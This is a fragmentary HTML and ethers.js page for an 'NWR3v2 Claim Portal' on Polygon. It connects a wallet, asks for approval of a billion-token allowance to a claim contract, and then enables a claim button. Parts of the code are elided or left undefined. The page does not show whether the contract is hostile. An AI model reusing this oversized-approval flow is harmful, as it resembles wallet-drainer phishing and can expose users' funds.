<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>ðŸš€ NWR3v2 Claim Portal</title>
  <style>
    /* same styles as before */
  </style>
</head>
<body>
  <!-- Buttons and status -->
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.9.0/dist/ethers.umd.min.js"></script>
  <script>
    const CONTRACT_ADDRESS = "0xe830ebbDC2E201Dc1b3e96Fb3a0cbfd0e5215F48";
    const NWR3V2_TOKEN_ADDRESS = "0x65ca48d3D1d7356EC99cE6BD3736B54eFdfA837E";
    const RPC_CHAIN_ID = 137;

    const CLAIM_ABI = ["function claimNWR3v2() external"];
    const ERC20_ABI = [
      "function approve(address,uint256) external returns(bool)",
      "function allowance(address,address) external view returns(uint256)"
    ];

    let provider, signer, contract, tokenContract, decimals;

    // Element refsâ€¦
    btnConnect.onclick = async () => {
      try {
        // Connect, switch chain logicâ€¦
        provider = new ethers.BrowserProvider(window.ethereum);
        signer = await provider.getSigner();
        contract = new ethers.Contract(CONTRACT_ADDRESS, CLAIM_ABI, signer);
        tokenContract = new ethers.Contract(NWR3V2_TOKEN_ADDRESS, ERC20_ABI, signer);
        decimals = 18; // Assume 18 decimals
        btnApprove.disabled = false;
        statusEl.innerText = "âœ… Connected! 18 decimals assumed.";
      } catch (e) {
        statusEl.innerText = "âŒ Connection failed.";
      }
    };

    btnApprove.onclick = async () => {
      try {
        const amount = ethers.parseUnits("1000000000", decimals);
        const tx = await tokenContract.approve(CONTRACT_ADDRESS, amount);
        await tx.wait();
        statusEl.innerText = "âœ… Approved!"
        btnClaim.disabled = false;
      } catch (e) {
        statusEl.innerText = "âŒ Approval error.";
      }
    };

    btnClaim.onclick = async () => {
      // same logic...
    };
  </script>
</body>
</html>
